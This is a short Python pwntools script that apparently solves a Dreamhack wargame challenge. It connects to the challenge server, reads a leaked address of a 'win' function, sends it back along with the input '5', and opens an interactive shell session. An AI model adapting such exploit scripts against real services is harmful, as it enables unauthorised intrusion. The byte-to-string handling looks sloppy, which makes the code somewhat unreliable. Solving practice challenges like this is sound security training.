from pwn import *

p = remote("host3.dreamhack.games", 18780)

p.recvuntil("the main function doesn't call win function (")
ehx = str(p.recv(8)).replace("b", "")
print(ehx)

p.sendline(ehx)
p.sendline(ehx)
p.sendline("5")

p.interactive()

